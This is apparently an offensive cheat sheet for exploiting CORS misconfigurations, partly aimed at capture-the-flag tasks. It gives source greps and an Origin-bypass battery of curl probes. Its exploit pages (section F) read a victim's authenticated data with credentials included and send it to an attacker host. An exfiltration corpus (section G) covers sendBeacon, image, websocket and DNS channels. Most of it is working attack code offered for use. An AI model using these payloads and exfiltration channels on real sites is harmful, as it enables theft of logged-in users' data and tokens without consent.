# Extended corpus — every CORS signal and payload by family

The complete index of what to grep, probe, and test — organized by
the gate it attacks.

---

## A. The source greps — finding the CORS config

```bash
# the framework CORS call
grep -rnoiE 'cors\(|CORS\(|CORSMiddleware|flask_cors|rack-cors|django-cors-headers|@CrossOrigin|AddCors|EnableCors|fruitcake|allowed_origins|allow_origins|origins=' \
  <src> | head -30

# the hand-rolled header set
grep -rnoiE 'Access-Control-Allow-Origin|setHeader.*Origin|header.*Allow-Origin|allow_origin' <src>

# the credential allow
grep -rnoiE 'Access-Control-Allow-Credentials|supports_credentials|allow_credentials|allowCredentials|credentials.*true' <src>
```

## B. The ACAO value families

```text
reflected — the request's Origin echoed back — THE canonical vuln
*         — a public read; never credentialed
null      — opaque-origin allowed
fixed     — a named allowlisted origin
subdomain — *.target.com — subdomain trust
prefix/suffix — startswith/endswith check — bypassable
regex     — a pattern match — often loose
absent    — no CORS — not the class
```

## C. The Origin-bypass battery — ordered by check shape

```bash
ORIGINS=(
'https://evil.com'                        # reflect / open
'null'                                    # opaque
'https://target.com.evil.com'             # suffix 'target.com'
'https://eviltarget.com'                  # prefix 'target.com'
'https://evil-target.com'                 # substring
'https://sub.target.com'                  # subdomain-trust
'https://target.com@evil.com'             # userinfo — url-parse confusion
'https://evil.com?target.com'             # query confusion
'https://evil.com#target.com'             # fragment confusion
'https://target.com%2eevil.com'           # encoded dot
'https://target.com%60.evil.com'          # backtick
'https://target.com-.evil.com'            # hyphen subdomain
'https://target.com_.evil.com'            # underscore
'https://target.com:443'                  # explicit port
'https://target.com.'                     # trailing dot
'http://target.com'                       # scheme-change
'https://targetx.com'                     # near-typo
'https://www.target.com.evil.com'         # nested
)
for o in "${ORIGINS[@]}"; do
  echo -n "$o => "
  curl -s -i -b "$CJ" "$BASE/api/me" -H "Origin: $o" | \
    grep -i 'access-control-allow-origin' || echo 'no ACAO'
done
```

## D. The credential-gate probes

```bash
# ACAC present?
curl -s -i -b "$CJ" "$BASE/api/me" -H 'Origin: https://evil.com' | \
  grep -i 'access-control-allow-credentials'

# the cookie's SameSite — does it ride the fetch?
curl -i -b "$CJ" "$BASE/" | grep -i 'set-cookie'
#   SameSite=None; Secure → attaches
#   SameSite=Lax/Strict   → doesn't attach

# a non-cookie credential — a Bearer the page can set
curl -s -i "$BASE/api/me" -H 'Authorization: Bearer <t>' \
  -H 'Origin: https://evil.com' | grep -i 'access-control'
```

## E. The preflight probes — per method+header

```bash
# a GET preflight
curl -i -X OPTIONS "$BASE/api/x" \
  -H 'Origin: https://evil.com' \
  -H 'Access-Control-Request-Method: GET'

# a custom-header preflight
curl -i -X OPTIONS "$BASE/api/x" \
  -H 'Origin: https://evil.com' \
  -H 'Access-Control-Request-Method: GET' \
  -H 'Access-Control-Request-Headers: X-Token'

# a non-simple-method preflight
for m in PUT DELETE PATCH POST; do
  echo -n "$m => "
  curl -s -i -X OPTIONS "$BASE/api/x" \
    -H 'Origin: https://evil.com' \
    -H "Access-Control-Request-Method: $m" | \
    grep -i 'access-control-allow-methods'
done
```

## F. The exploit-page variants

```html
<!-- the canonical read+exfil -->
<script>fetch('https://t/api/me',{credentials:'include'})
.then(r=>r.json()).then(d=>fetch('https://a/?d='+btoa(JSON.stringify(d))))</script>
```

```html
<!-- a DOM-scrape — the flag in HTML -->
<script>fetch('https://t/admin',{credentials:'include'})
.then(r=>r.text()).then(h=>{var m=h.match(/FLAG\{[^}]+\}/);
if(m)fetch('https://a/?f='+m[0])})</script>
```

```html
<!-- a text-read — a raw flag body -->
<script>fetch('https://t/flag',{credentials:'include'})
.then(r=>r.text()).then(d=>fetch('https://a/?d='+encodeURIComponent(d)))</script>
```

```html
<!-- a multi-read chain -->
<script>
fetch('https://t/api/token',{credentials:'include'})
.then(r=>r.json())
.then(t=>fetch('https://t/api/admin?key='+t.k,{credentials:'include'}))
.then(r=>r.json()).then(d=>fetch('https://a/?d='+btoa(JSON.stringify(d))))
</script>
```

```html
<!-- a null-origin data: URL -->
<iframe sandbox="allow-scripts" src="data:text/html,
<script>fetch('https://t/api/x',{credentials:'include'})
.then(r=>r.text()).then(d=>parent.postMessage(d,'*'))</script>">
</iframe>
<script>window.onmessage=e=>fetch('https://a/?d='+e.data)</script>
```

```html
<!-- a JSONP read -->
<script src="https://t/api/me?callback=leak"></script>
<script>function leak(d){fetch('https://a/?d='+JSON.stringify(d))}</script>
```

## G. The exfil-channel corpus

```js
// a GET with the data
fetch('https://a/x?d='+btoa(d))
// a beacon (fire-and-forget)
navigator.sendBeacon('https://a/x',d)
// an image GET
new Image().src='https://a/x?d='+btoa(d)
// a websocket
new WebSocket('wss://a/x').onopen=function(){this.send(d)}
// a postMessage to parent
parent.postMessage(d,'*')
// a location-href exfil
location='https://a/x?d='+btoa(d)
// a DNS exfil
new Image().src='https://'+d+'.a.com/'
```

## H. The alternate-read corpus

```bash
# JSONP — a script-tag read
curl -s -b "$CJ" "$BASE/api/x?callback=x" | head -1   # x({...})

# a JS-served endpoint — readable as a script
curl -s -i -b "$CJ" "$BASE/api/x.js" | grep -i 'content-type'
#   application/javascript → a <script src> read
```

## I. The decision-matrix quick table

```text
ACAO reflected + ACAC + cookie-ride   → full read → THE VULN
ACAO null + ACAC + cookie-ride        → opaque read → vuln
ACAO * (any)                          → public read → NOT vuln
ACAO * + ACAC                         → INVALID → rejected
ACAO fixed (your origin in it)        → read → vuln (if reachable)
ACAO fixed (your origin NOT in it)    → closed → bypass or pivot
no ACAO                               → not CORS
preflight-strict + no simple path     → closed for non-simple
```
